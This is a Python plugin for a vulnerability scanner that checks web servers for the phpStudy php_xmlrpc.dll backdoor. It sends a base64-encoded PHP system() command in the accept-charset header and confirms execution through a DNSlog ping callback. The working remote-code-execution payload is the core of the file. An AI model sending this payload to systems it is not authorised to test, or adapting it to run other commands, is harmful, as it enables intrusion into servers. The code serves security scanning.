#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Dnslog
import urllib3
import requests
import base64
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['disclosure'] = '2019-10-13'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "PHPStudyBackdoor"  # 插件名称
        self.info['name'] ='PHPStudyBackdoor脚本漏洞' #漏洞名称
        self.info['affects'] = "PHPStudy"  # 漏洞组件
        self.info['desc_content'] = "使用广泛的PHP环境集成程序包phpStudy被公告疑似遭遇供应链攻击，程序包自带PHP的php_xmlrpc.dll模块隐藏有后门"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数

    DL=Dnslog()
    payload = "/index.php"
    commandS = ('''system("ping {}");''').format(DL.dns_host())
    cmd = base64.b64encode(commandS.encode('utf-8'))
    try:
        payload_url = url+payload

        Headers['Sec-Fetch-Mode']='navigate'
        Headers['Sec-Fetch-User']='?1'
        Headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
        Headers['Sec-Fetch-Site']='none'
        Headers['accept-charset']=cmd


        resp = requests.get(payload_url,headers=Headers, timeout=5, proxies=proxies,verify=False)
        time.sleep(2)
        if DL.result():
            Medusa = "{} 存在phpStudyBackdoor脚本漏洞\r\n漏洞详情:\r\nPayload:{}\r\nHeader:{}\r\nDNSLOG内容:{}\r\n".format(url, payload_url,Headers,DL.dns_host())
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类
